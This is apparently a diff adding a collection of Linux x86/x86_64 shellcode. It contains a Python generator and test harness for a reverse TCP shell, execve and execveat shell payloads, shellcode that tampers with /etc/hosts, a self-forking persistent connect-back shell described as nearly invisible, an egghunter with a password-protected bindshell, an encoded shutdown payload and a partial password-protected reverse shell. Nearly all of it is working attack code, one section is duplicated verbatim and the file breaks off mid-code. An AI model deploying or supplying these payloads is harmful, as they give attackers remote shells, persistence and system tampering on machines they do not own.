@@ -1,0 +1,3707 @@
+#!/usr/bin/env python3
+
+import ctypes, struct, binascii, os, socket
+from keystone import *
+
+#####################################################
+#                                                   #
+#   Dynamic null-free reverse TCP shell(65 bytes)   *
+#           Written by Philippe Dugre               #
+#                                                   #
+#####################################################
+
+#shellcode = 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
+#shellcode += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee"
+#shellcode += 	b"\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54"
+#shellcode += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
+#shellcode += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
+#shellcode += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+#shellcode += 	b"\x51\x54\x5f\x0f\x05"
+
+# This script requires keystone to generate the shellcode,
+# but it can easily be compiled with nasm with a few modifications.
+
+# Generates struct from IP and port
+def sockaddr():
+
+    # Change this
+    IP = "127.0.0.1"
+    PORT = 4444
+
+    family = struct.pack('H', socket.AF_INET)
+    portbytes = struct.pack('H', socket.htons(PORT))
+    ipbytes = socket.inet_aton(IP)
+    number = struct.unpack('Q', family + portbytes + ipbytes)
+    number = -number[0]        #negate
+    return "0x" + binascii.hexlify(struct.pack('>q', number)).decode('utf-8')
+
+
+# Function to format shellcode to a printable output. Currently python3 formatting.
+# Modify according to the language you use.
+def format_shellcode(shellcode):
+    LINE_LENGTH=40
+    raw = binascii.hexlify(shellcode)
+    escaped = (b"\\x" + b"\\x".join(raw[i:i+2] for i in range (0, len(raw), 2))).decode('utf-8')
+    lines = [escaped[i: i+LINE_LENGTH] for i in range(0, len(escaped), LINE_LENGTH)]
+    return "shellcode = \tb\"" + "\"\nshellcode += \tb\"".join(lines) + "\""
+
+
+def main():
+    # Note: null-byte depends on the address and port.
+    # Special modifications might be needed for some address.
+    address = sockaddr()
+
+    # Shellcode is here
+    assembly = (
+        "socket:                             "
+        "   push byte 41                    ;"      # Push/pop will set syscall num
+        "   pop rax                         ;"
+        "   cdq                             ;"      # cdq sets rdx to 0 if rax is positive
+        "   push byte 2                     ;"      # AF_INET = 2
+        "   pop rdi                         ;"
+        "   push byte 1                     ;"      # SOCK_STREAM = 1
+        "   pop rsi                         ;"
+        "   syscall                         ;"      # socket(AF_INET, SOCK_STREAM, 0)
+        "connect:                           ;"
+        "   xchg eax, edi                   ;"      # rdi is 2, so moving only al is doable
+        "   mov al, 42                      ;"
+        "   mov rcx, " + address +         ";" +    # Socket address and port
+        "   neg rcx                         ;"
+        "   push rcx                        ;"
+        "   push rsp                        ;"      # mov rsi, rsp. This it the pointer to sockaddr
+        "   pop rsi                         ;"
+        "   mov dl, 16                      ;"      # sockaddr length
+        "   syscall                         ;"      # connect(s, addr, len(addr))
+        "dup2:                              ;"
+        "   push byte 3                     ;"      # Start with 3 and decrement
+        "   pop rsi                         ;"
+        "dup2_loop:                          "      # Duplicate socket fd into stdin,
+                                                    # stdout and stderr, which fd are 0, 1 and 2
+        "   mov al, 33                      ;"      # If there is no error, rax is 0 on connect and dup2
+        "   dec esi                         ;"
+        "   syscall                         ;"      # dup2(s, rsi)
+        "   jnz dup2_loop                   ;"      # Jump when esi == 0
+        "execve:                             "
+        "   cdq                             ;"
+        "   mov al, 59                      ;"      # execve syscall is 59
+        "   push rdx                        ;"      # Put null-byte in /bin//sh
+        "   mov rcx, 0x68732f2f6e69622f     ;"      # /bin//sh
+        "   push rcx                        ;"
+        "   push rsp                        ;"      # rsp points to the top of the stack, which is occupied by /bin/sh
+        "   pop rdi                         ;"      # We use a push/pop to prevent null-byte and get a shorter shellcode
+        "   syscall                         ;"      # execve('/bin//sh', 0, 0)
+    )
+
+    engine = Ks(KS_ARCH_X86, KS_MODE_64)
+    shellcode, count = engine.asm(assembly)
+    shellcode = bytearray(shellcode) # Needs to be mutable for later
+
+    print("Number of instructions: " + str(count))
+
+    # Print shellcode in a copy-pasteable format
+    print()
+    print("Shellcode length: %d" % len(shellcode))
+    print()
+    print(format_shellcode(shellcode))
+    print()
+
+    #####################################################################
+    #                   TESTING THE SHELLCODE                           #
+    #####################################################################
+
+    # The rest of the script is used to test the shellcode. Don't run this if you just need the shellcode
+
+
+    # Leave time to attach the debugger
+    print("If you want to debug, attach the debugger to the python process with pid %d then press enter." % os.getpid())
+    input()
+
+    # Load libraries
+    libc = ctypes.cdll.LoadLibrary("libc.so.6")
+    libpthread = ctypes.cdll.LoadLibrary("libpthread.so.0")
+
+    # Put the shellcode into a ctypes valid type.
+    shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    # Both function returns 64bits pointers
+    libc.malloc.restype = ctypes.POINTER(ctypes.c_int64)
+    libc.mmap.restype = ctypes.POINTER(ctypes.c_int64)
+
+    # Get page size for mmap
+    page_size = libc.getpagesize()
+
+    # mmap acts like malloc, but can also set memory protection so we can create a Write/Execute shellcodefer
+    # void *mmap(void *addr, size_t len, int prot, int flags,
+    #   int fildes, off_t off);
+    ptr = libc.mmap(ctypes.c_int64(0),      # NULL
+            ctypes.c_int(page_size),        # Pagesize, needed for alignment
+            ctypes.c_int(0x07),             # Read/Write/Execute: PROT_READ | PROT_WRITE | PROT_EXEC
+            ctypes.c_int(0x21),             # MAP_ANONYMOUS | MAP_SHARED
+            ctypes.c_int(-1),               # No file descriptor
+            ctypes.c_int(0))                # No offset
+
+    # Copy shellcode to newly allocated page.
+    libc.memcpy(ptr,                        # Destination of our shellcode
+                shellcode,                        # Shellcode location in memory
+                ctypes.c_int(len(shellcode)))     # Nomber of bytes to copy
+
+    # Allocate space for pthread_t object.
+    # Note that pthread_t is 8 bytes long, so we'll treat it as an opaque int64 for simplicity
+    thread = libc.malloc(ctypes.c_int(8))
+
+    # Create pthread in the shellcodefer.
+    # int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
+    #   void *(*start_routine) (void *), void *arg);
+    libpthread.pthread_create(thread,       # The pthread_t structure pointer where the thread id will be stored
+                            ctypes.c_int(0),# attributes = NULL
+                            ptr,            # Our shellcode, which is what we want to execute
+                            ctypes.c_int(0))# NULL, as we don't pass arguments
+
+    # Wait for the thread.
+    # int pthread_join(pthread_t thread, void **retval);
+    libpthread.pthread_join(thread.contents,# Here, we pass the actual thread object, not a pointer to it
+                        ctypes.c_int(0))# Null, as we don't expect a return value
+
+
+if(__name__ == "__main__"):
+    main()
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/** x86_64 execveat("/bin//sh") 29 bytes shellcode
+
+--[ AUTHORS
+	* ZadYree
+	* vaelio
+	* DaShrooms
+
+~ Armature Technologies R&D
+
+--[ asm
+6a 42                   push   0x42
+58                      pop    rax
+fe c4                   inc    ah
+48 99                   cqo
+52                      push   rdx
+48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
+2f 73 68
+57                      push   rdi
+54                      push   rsp
+5e                      pop    rsi
+49 89 d0                mov    r8, rdx
+49 89 d2                mov    r10, rdx
+0f 05                   syscall
+
+--[ COMPILE
+gcc execveat.c -o execveat # NX-compatible :)
+
+**/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+const uint8_t sc[29] = {
+    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
+    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
+    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
+};
+
+/** str
+\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
+\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
+\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
+**/
+
+int main (void)
+{
+  ((void (*) (void)) sc) ();
+  return EXIT_SUCCESS;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+; Title: Add map in /etc/hosts file - 110 bytes
+; Date: 2014-10-29
+; Platform: linux/x86_64
+; Website: http://osandamalith.wordpress.com
+; Author: Osanda Malith Jayathissa (@OsandaMalith)
+
+global _start
+    section .text
+
+_start:
+    ;open
+    xor rax, rax 
+    add rax, 2  ; open syscall
+    xor rdi, rdi
+    xor rsi, rsi
+    push rsi ; 0x00 
+    mov r8, 0x2f2f2f2f6374652f ; stsoh/
+    mov r10, 0x7374736f682f2f2f ; /cte/
+    push r10
+    push r8
+    add rdi, rsp
+    xor rsi, rsi
+    add si, 0x401
+    syscall
+
+    ;write
+    xchg rax, rdi
+    xor rax, rax
+    add rax, 1 ; syscall for write
+    jmp data
+
+write:
+    pop rsi 
+    mov dl, 19 ; length in rdx
+    syscall
+
+    ;close
+    xor rax, rax
+    add rax, 3
+    syscall
+
+    ;exit
+    xor rax, rax
+    mov al, 60
+    xor rdi, rdi
+    syscall 
+
+data:
+    call write
+    text db '127.1.1.1 google.lk'
+*/
+
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] =  "\x48\x31\xc0\x48\x83\xc0\x02\x48"
+                        "\x31\xff\x48\x31\xf6\x56\x49\xb8"
+                        "\x2f\x65\x74\x63\x2f\x2f\x2f\x2f"
+                        "\x49\xba\x2f\x2f\x2f\x68\x6f\x73"
+                        "\x74\x73\x41\x52\x41\x50\x48\x01"
+                        "\xe7\x48\x31\xf6\x66\x81\xc6\x01"
+                        "\x04\x0f\x05\x48\x97\x48\x31\xc0"
+                        "\x48\x83\xc0\x01\xeb\x18\x5e\xb2"
+                        "\x13\x0f\x05\x48\x31\xc0\x48\x83"
+                        "\xc0\x03\x0f\x05\x48\x31\xc0\xb0"
+                        "\x3c\x48\x31\xff\x0f\x05\xe8\xe3"
+                        "\xff\xff\xff\x31\x32\x37\x2e\x31"
+                        "\x2e\x31\x2e\x31\x20\x67\x6f\x6f"
+                        "\x67\x6c\x65\x2e\x6c\x6b";
+
+
+int
+main() {
+    printf("Shellcode Length:  %d\n", (int)strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
+
+}
+/*EOF*/
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+#Title: connect back shellcode that splits from the process it was injected into, and then stays persistent and difficult to remove. It is also very close to invisible due to some interesting effects created by forking, and calling the rdtsc instruction
+#length: 139 bytes
+#Date: 14 September  2014
+#Author: Aaron Yool (aka: MadMouse)
+#tested On: Linux kali 3.14-kali1-amd64 #1 SMP Debian 3.14.5-1kali1 (2014-06-07) x86_64 GNU/Linux
+*/
+ 
+/*
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on
+irc.enigmagroup.org
+;
+; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
+;
+; part of my shellcode for noobs lesson series hosted in #goatzzz on
+irc.enigmagroup.org
+;
+; 32bit call: eax args: ebx, ecx, edx, esi, edi, and ebp
+[bits 32]
+section .text
+global _start
+_start:
+; fork(void);
+    xor eax,eax ; cleanup after rdtsc
+    xor edx,edx ; ....
+    xor ebx,ebx ; cleanup the rest
+    xor ecx,ecx ; ....
+    mov al,0x02
+    int 0x80
+    cmp eax,1    ; if this is a child, or we have failed to clone
+    jl fork        ; jump to the main code
+    jmp exit
+fork:
+; socket(AF_INET, SOCK_STREAM, 0);
+    push eax
+    push byte 0x1 ; SOCK_STREAM
+    push byte 0x2 ; AF_INET
+    mov al, 0x66 ; sys_socketcall
+    mov bl,0x1    ; sys_socket
+    mov ecx,esp
+    int 0x80
+ 
+; dup2(s,i);
+    mov ebx,eax ; s
+    xor ecx,ecx
+loop:
+    mov al,0x3f    ; sys_dup2
+    int 0x80
+    inc ecx
+    cmp ecx,4
+    jne loop
+ 
+; connect(s, (sockaddr *) &addr,0x10);
+    push 0x0101017f        ; IP = 127.1.1.1
+    push word 0x391b    ; PORT = 6969
+    push word 0x2        ; AF_INET
+    mov ecx,esp
+ 
+    push byte 0x10
+    push ecx        ;pointer to arguments
+    push ebx        ; s -> standard out/in
+    mov ecx,esp
+    mov al,0x66
+    int 0x80
+    xor ecx,ecx
+    sub eax,ecx
+    jnz cleanup ; cleanup and start over
+ 
+; fork(void);
+    mov al,0x02
+    int 0x80
+    cmp eax,1    ; if this is a child, or we have failed to clone
+    jl client    ; jump to the shell
+    xor eax,eax
+    push eax
+    jmp cleanup ; cleanup and start over
+ 
+client:
+; execve(SHELLPATH,{SHELLPATH,0},0);
+    mov al,0x0b
+    jmp short sh
+load_sh:
+    pop esi
+    push edx ; 0
+    push esi
+    mov ecx,esp
+    mov ebx,esi
+    int 0x80
+ 
+cleanup:
+; close(%ebx)
+    xor eax,eax
+    mov al,0x6
+    int 0x80
+    pause
+    rdtsc
+    pause
+    jmp _start
+ 
+exit:
+; exit(0);
+    xor eax,eax
+    mov al,0x1
+    xor ebx,ebx
+    int 0x80
+ 
+sh:
+    call load_sh
+    db "/bin/bash"
+ 
+*/
+ 
+const char evil[] =
+"\x31\xc0\x31\xd2\x31\xdb\x31\xc9\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x02\xeb\x62\x50\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x04\x75\xf6\x68\x7f\x01\x01\x01\x66\x68\x1b\x39\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x31\xc9\x29\xc8\x75\x1b\xb0\x02\xcd\x80\x83\xf8\x01\x7c\x05\x31\xc0\x50\xeb\x0d\xb0\x0b\xeb\x1f\x5e\x52\x56\x89\xe1\x89\xf3\xcd\x80\x31\xc0\xb0\x06\xcd\x80\xf3\x90\x0f\x31\xf3\x90\xeb\x8b\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";
+ 
+typedef void (*shellcode)(void);
+void main(void)
+{
+    ((shellcode)evil)();
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; Author Doreth.Z10
+;
+; Linux x86_64 Egghunter using sys_access()
+; Shellcode size 49 bytes
+;
+
+global _start
+
+section .text
+
+_start:
+
+    xor rsi, rsi        ; Some prep junk.
+    push rsi
+    pop rdx
+    push 8
+    pop rbx
+
+go_end_of_page:
+    or dx, 0xfff        ; We align with a page size of 0x1000
+        
+next_byte:
+
+    inc rdx             ; next byte offset
+    push 21         
+    pop rax             ; We load access() in RAX
+    push rdx
+    pop rdi
+    add rdi, rbx        ; We need to be sure our 8 byte egg check does not span across 2 pages
+    syscall             ; syscall to access()
+
+    cmp al, 0xf2        ; Checks for EFAULT.  EFAULT indicates bad page access.
+ 
+    jz go_end_of_page   ; if EFAULT, try next page
+
+    ; --
+    ; Put your won egg here !
+
+    mov eax, 0xBEBDBEBD ; Egg contruction so we dont catch ourself !
+    not eax             ; Important, EGG must contain NOP like instruction bytecode.
+    
+    ; --
+    mov rdi, rdx
+    scasd
+    jnz next_byte       ; if egg does not match, try next byte
+    cmp eax, [rdi]
+    jnz next_byte       ; if egg does not match, try next byte
+
+    jmp rdi             ; Good, found egg. Jump !
+                        ; Important, EGG must contain NOP like instruction bytecode.
+
+
+
+;
+; Egghunter demonstration
+;
+; bindshell is pushed in the heap using a malloc() call and pre-pended with the egg. Then egghunter is fired.
+;
+; Depending on size of the malloc() call, binshell can be anywhere in the address space.
+; For a big malloc() size like 1 000 000 bytes, it will be placed far in the address space.
+; A malloc(1000000) was tested on a Unbuntu system with Inter Core i7 and it took over 9 hrs for the egghunter
+; to find the egg. 
+;
+; Enjoy.
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned char egg[] = 
+"YOUR EGG HERE 4 bytes";
+
+// In this example we use a password protected binshell on port 1337: pAzzW0rd 
+unsigned char bindshell[] = 
+"\xeb\x09\x48\x31\xff\x48\xf7\xe7\x57\x5e\xc3\x55\x48\x89\xe5\xe8\xee\xff\xff\xff\x04\x29\x40\x80\xc7\x02\xff\xc6\x0f\x05\x50\xe8\xde\xff\xff\xff\x04\x31\x48\x8b\x3c\x24\x56\x81\xc6\x03\x01\x05\x39\x66\x81\xee\x01\x01\x56\x48\x89\xe6\x80\xc2\x10\x0f\x05\xe8\xbe\xff\xff\xff\x04\x32\x48\x8b\x7d\xf8\x0f\x05\xe8\xb1\xff\xff\xff\x04\x2b\x48\x8b\x7d\xf8\x48\x89\xe6\x80\xc2\x18\x52\x48\x89\xe2\x0f\x05\x49\x89\xc0\xe8\x97\xff\xff\xff\x4c\x89\xc7\x40\x80\xec\x18\x48\x89\xe6\x80\xc2\x18\x0f\x05\x48\xb8\x70\x41\x7a\x7a\x57\x30\x72\x64\x48\x89\xe7\x48\xaf\x75\x42\x48\x31\xc0\x4c\x89\xc7\x48\x31\xf6\x40\x80\xc6\x02\x04\x21\x0f\x05\x48\x31\xc0\x04\x21\x48\xff\xce\x75\xf4\x0f\x05\xe8\x55\xff\xff\xff\x50\x04\x3b\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x50\x48\x89\xe7\x52\x48\x89\xe2\x57\x48\x89\xe6\x48\x89\xec\x5d\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05";
+
+unsigned char egghunter[] = 
+"\x48\x31\xf6\x56\x5a\x6a\x08\x5b\x66\x81\xca\xff\x0f\x48\xff\xc2\x6a\x15\x58\x52\x5f\x48\x01\xdf\x0f\x05\x3c\xf2\x74\xea\xb8\xbd\xbe\xbd\xbe\xf7\xd0\x48\x89\xd7\xaf\x75\xe2\x3b\x07\x75\xde\xff\xe7";
+
+
+
+main()
+{
+
+    char *heap = (char*)malloc(1000000);
+    memset(heap, '\0', 512);
+    strncpy(heap, egg, 4);
+    strncpy(heap+4, egg, 4);
+    strncpy(heap+8, bindshell, 212);
+
+    printf("Egghunter Length: %d\n", strlen(egghunter));
+    printf("Shellcode Length: %d\n", strlen(bindshell));
+        int (*ret)() = (int(*)())egghunter;
+        ret();
+    return 0;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; Author Doreth.Z10
+;
+; Linux x86_64 Egghunter using sys_access()
+; Shellcode size 49 bytes
+;
+
+global _start
+
+section .text
+
+_start:
+
+    xor rsi, rsi        ; Some prep junk.
+    push rsi
+    pop rdx
+    push 8
+    pop rbx
+
+go_end_of_page:
+    or dx, 0xfff        ; We align with a page size of 0x1000
+        
+next_byte:
+
+    inc rdx             ; next byte offset
+    push 21         
+    pop rax             ; We load access() in RAX
+    push rdx
+    pop rdi
+    add rdi, rbx        ; We need to be sure our 8 byte egg check does not span across 2 pages
+    syscall             ; syscall to access()
+
+    cmp al, 0xf2        ; Checks for EFAULT.  EFAULT indicates bad page access.
+ 
+    jz go_end_of_page   ; if EFAULT, try next page
+
+    ; --
+    ; Put your won egg here !
+
+    mov eax, 0xBEBDBEBD ; Egg contruction so we dont catch ourself !
+    not eax             ; Important, EGG must contain NOP like instruction bytecode.
+    
+    ; --
+    mov rdi, rdx
+    scasd
+    jnz next_byte       ; if egg does not match, try next byte
+    cmp eax, [rdi]
+    jnz next_byte       ; if egg does not match, try next byte
+
+    jmp rdi             ; Good, found egg. Jump !
+                        ; Important, EGG must contain NOP like instruction bytecode.
+
+
+
+;
+; Egghunter demonstration
+;
+; bindshell is pushed in the heap using a malloc() call and pre-pended with the egg. Then egghunter is fired.
+;
+; Depending on size of the malloc() call, binshell can be anywhere in the address space.
+; For a big malloc() size like 1 000 000 bytes, it will be placed far in the address space.
+; A malloc(1000000) was tested on a Unbuntu system with Inter Core i7 and it took over 9 hrs for the egghunter
+; to find the egg. 
+;
+; Enjoy.
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+unsigned char egg[] = 
+"YOUR EGG HERE 4 bytes";
+
+// In this example we use a password protected binshell on port 1337: pAzzW0rd 
+unsigned char bindshell[] = 
+"\xeb\x09\x48\x31\xff\x48\xf7\xe7\x57\x5e\xc3\x55\x48\x89\xe5\xe8\xee\xff\xff\xff\x04\x29\x40\x80\xc7\x02\xff\xc6\x0f\x05\x50\xe8\xde\xff\xff\xff\x04\x31\x48\x8b\x3c\x24\x56\x81\xc6\x03\x01\x05\x39\x66\x81\xee\x01\x01\x56\x48\x89\xe6\x80\xc2\x10\x0f\x05\xe8\xbe\xff\xff\xff\x04\x32\x48\x8b\x7d\xf8\x0f\x05\xe8\xb1\xff\xff\xff\x04\x2b\x48\x8b\x7d\xf8\x48\x89\xe6\x80\xc2\x18\x52\x48\x89\xe2\x0f\x05\x49\x89\xc0\xe8\x97\xff\xff\xff\x4c\x89\xc7\x40\x80\xec\x18\x48\x89\xe6\x80\xc2\x18\x0f\x05\x48\xb8\x70\x41\x7a\x7a\x57\x30\x72\x64\x48\x89\xe7\x48\xaf\x75\x42\x48\x31\xc0\x4c\x89\xc7\x48\x31\xf6\x40\x80\xc6\x02\x04\x21\x0f\x05\x48\x31\xc0\x04\x21\x48\xff\xce\x75\xf4\x0f\x05\xe8\x55\xff\xff\xff\x50\x04\x3b\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x50\x48\x89\xe7\x52\x48\x89\xe2\x57\x48\x89\xe6\x48\x89\xec\x5d\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05";
+
+unsigned char egghunter[] = 
+"\x48\x31\xf6\x56\x5a\x6a\x08\x5b\x66\x81\xca\xff\x0f\x48\xff\xc2\x6a\x15\x58\x52\x5f\x48\x01\xdf\x0f\x05\x3c\xf2\x74\xea\xb8\xbd\xbe\xbd\xbe\xf7\xd0\x48\x89\xd7\xaf\x75\xe2\x3b\x07\x75\xde\xff\xe7";
+
+
+
+main()
+{
+
+    char *heap = (char*)malloc(1000000);
+    memset(heap, '\0', 512);
+    strncpy(heap, egg, 4);
+    strncpy(heap+4, egg, 4);
+    strncpy(heap+8, bindshell, 212);
+
+    printf("Egghunter Length: %d\n", strlen(egghunter));
+    printf("Shellcode Length: %d\n", strlen(bindshell));
+        int (*ret)() = (int(*)())egghunter;
+        ret();
+    return 0;
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; ===================================================================
+; Optimized version of shellcode at:
+; http://shell-storm.org/shellcode/files/shellcode-877.php
+; Author: SLAE64-1351 (Keyman)
+; Date: 14/09/2014
+;
+; Length: 64 bytes (got shorter by 1 byte :D )
+;
+; What's new is that some optimalization was performed on the
+; original code which left some space to do a basic decoding of the
+; command (/sbin/shutdown). Each byte (except the first one) was
+; decremented by 1. The decoder just adds 1 to each byte.
+;
+; ===================================================================
+ 
+section .text
+global _start
+ 
+_start:
+ 
+xor rax, rax                ; clear rax and rdx
+cdq
+ 
+; -------------------------------------------------------------------
+; 1. store '-h' on stack
+; -------------------------------------------------------------------
+ 
+push rax
+push word 0x682d ;-h
+push rsp
+pop rcx
+ 
+; -------------------------------------------------------------------
+; 2. store 'now' on stack
+; -------------------------------------------------------------------
+ 
+push rax
+push byte 0x77
+push word 0x6f6e ; now
+push rsp
+pop rbx
+ 
+push rax
+push rbx
+push rcx
+ 
+; -------------------------------------------------------------------
+; 3. store '/sbin/shutdown' on stack
+; -------------------------------------------------------------------
+ 
+push rsp
+pop rsi
+ 
+push rax
+jmp shutdown
+cont:
+pop rdi
+ 
+push 15
+pop rcx
+ 
+do_add:
+    add byte [rdi+rcx], 0x01
+    loop do_add
+ 
+push 59
+pop rax
+syscall
+ 
+shutdown:
+    call cont
+    c_1: db 0x2f, 0x2e, 0x2e, 0x72, 0x61, 0x68, 0x6d, 0x2e, 0x72, 0x67, 0x74, 0x73, 0x63, 0x6e, 0x76, 0x6d
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; ===================================================================
+; Optimized version of shellcode at:
+; http://shell-storm.org/shellcode/files/shellcode-867.php
+; Author: SLAE64-1351 (Keyman)
+; Date: 14/09/2014
+;
+; Length: 105 bytes (got shorter by 13 bytes)
+;
+; What's new is that some optimalization was performed on the
+; original code which left some space to do a basic decoding of the
+; file names. Each byte (except the first one) was xor'ed with the
+; value 0x32. The decoder part xor's each byte (except the first)
+; with this very same value.
+;
+; ===================================================================
+ 
+section .text
+global _start
+ 
+_start:
+        xor rsi, rsi
+        jmp string_1
+cont_1:
+        pop rdi
+ 
+        ; decode
+ 
+        push 24
+        pop rcx
+decode:
+        xor byte [rdi+rcx], 0x32
+        loop decode
+     
+        sub byte [rdi+11], 0x41         ; set last byte to 0x00
+        sub byte [rdi+24], 0x41         ; set last byte to 0x00
+ 
+        ; open (1)
+ 
+        push 2
+        pop rax
+        syscall
+ 
+        push rax
+        pop r14             ; source
+ 
+        ; open (2)
+ 
+        add rdi, 12
+        push 0x66
+        pop rsi
+        push 2
+        pop rax
+        syscall
+ 
+        push rax
+        pop r15             ; destination
+ 
+        ; read
+ 
+        xor rax, rax
+        push r14
+        pop rdi
+        push rsp
+        pop rsi
+        mov dx, 0xFFFF
+        syscall
+ 
+        ; write
+ 
+        push rax
+        pop rdx
+ 
+        push r15
+        pop rdi
+ 
+        push 1
+        pop rax
+        syscall
+ 
+        ; exit
+ 
+        push 60
+        pop rax
+        syscall
+ 
+string_1:
+    call cont_1
+    ; first byte stays the original value
+    s_1: db 0x2F, 0x57, 0x46, 0x51, 0x1D, 0x42, 0x53, 0x41, 0x41, 0x45, 0x56, 0x73, 0x1D, 0x46, 0x5F, 0x42, 0x1D, 0x5D, 0x47, 0x46, 0x54, 0x5B, 0x5E, 0x57, 0x73
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; ===================================================================
+; Password Protected Reverse Shell
+; Author: SLAE64-1351 (Keyman)
+; Date: 04/09/2014
+;
+; Shellcode length:  136 bytes
+;
+; Description:
+;
+;    Simple reverse shell (listens on port 4444 by default) with
+;    bytes password protection. Using a 4 bytes long password is
+;    still reasonably strong for a single-shot connection and keeps
+;    the code shorter.
+;
+;    To change the port or the password just modify the values of the
+;    exp_port and exp_pass "variables" below.
+;
+;    Before the code gets executed make sure to create a listener:
+;   
+;    nc -lvp <port number>
+;
+;    After you receive the connection you will see no password
+;    prompt. Just type in the 4 bytes long password and hit enter.
+;    If the password matches, you are ready to type OS commands.
+;
+; ===================================================================
+ 
+global _start
+section .text
+ 
+; -------------------------------------------------------------------
+; Preprocessor directives so you can easily change the port and the
+; password.
+; -------------------------------------------------------------------
+ 
+; Host to connect to. Please note that this value will have
+; 0x02020202 added to it, this way avoiding the NULL bytes.
+ 
+%define exp_host    0xFEFDFE7D      ; 127.0.0.1
+ 
+; Port number to listen on.
+%define exp_port        0x5c11          ; 4444
+ 
+; Password to use. Make sure it's not longer than 4 bytes.
+%define exp_pass        0x6c6c6568      ; hell
+ 
+; -------------------------------------------------------------------
+; DO NOT TOUCH
+; preprocessor directives so syscalls can be easily referenced
+; -------------------------------------------------------------------
+ 
+%define sys_connect 42
+%define sys_read     0
+%define sys_execve  59
+%define sys_dup2    33
+ 
+_start:
+ 
+    ; ---------------------------------------------------------------
+    ; START: create socket
+    ; ---------------------------------------------------------------
+      xor rax, rax
+      push rax              ; saving for sockaddr
+      push rax                          ; struct
+      push rax              ; clear rax later
+      push rax              ; set rdx to 0
+      pop rdx               ; protocol
+      mov al, 2
+      push rax
+      push rax
+      pop rsi
+      pop rdi               ; PF_INET
+      shr rsi, 1            ; SOCK_STREAM
+      add al, 39            ; socket syscall (41)
+      syscall
+ 
+    ; ---------------------------------------------------------------
+    ; START: create struct
+    ;
+    ; srv_addr.sin_family = AF_INET;
+    ; srv_addr.sin_addr.s_addr = INADDR_ANY;
+    ; srv_addr.sin_port = htons(portno);
+    ;
+    ; This is how it looks like on the stack:
+    ; 0x02    0x00    0x11    0x5c    0x7f    0x00    0x00    0x01
+    ; 0x20    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+    ; ---------------------------------------------------------------
+ 
+      ; TODO: have to make this shorter somehow
+      mov byte [rsp], 2                 ; set values
+      mov word [rsp+2], exp_port
+      mov dword [rsp+4], exp_host
+      add dword [rsp+4], 0x02020202
+      push rsp
+      pop rsi                           ; addr of struct in rsi
+ 
+    ; ---------------------------------------------------------------
+    ; START: connect
+    ; ---------------------------------------------------------------
+ 
+                    ; rdx is still 0
+      push rax              ; socket fd
+      pop rdi
+      add dl, 16
+      mov al, sys_connect
+      syscall
+ 
+    ; ---------------------------------------------------------------
+    ; get passwd
+    ;
+    ; We will work with a 4 byte password, should be more than
+    ; enough as no brute forcing is possible. Chances to guess
+    ; the right value is 0.  Of course passwd should not contain
+    ; null bytes.
+    ;
+    ; n = read(newsockfd,buffer,4);
+    ; ---------------------------------------------------------------
+ 
+      push rax              ; buffer filled with 0s
+      push rsp              ; setup pointer to buf
+      pop rsi
+      sub rdx, 12           ; set bytes to read (4)
+      syscall
+ 
+      ; compare pass received with valid pass and exit if no match
+ 
+      push rax
+      pop rcx
+ 
+      push rdi              ; save socket
+      pop rax
+ 
+      sub rcx, 3            ; read only once
+      push rsp
+      pop rdi
+      push exp_pass
+      push rsp
+      pop rsi
+      cmpsq
+      jne passfail          ; passwd match, give shell
+ 
+shell:
+    ; ---------------------------------------------------------------
+    ; 6. exec shell
+    ; ---------------------------------------------------------------
+ 
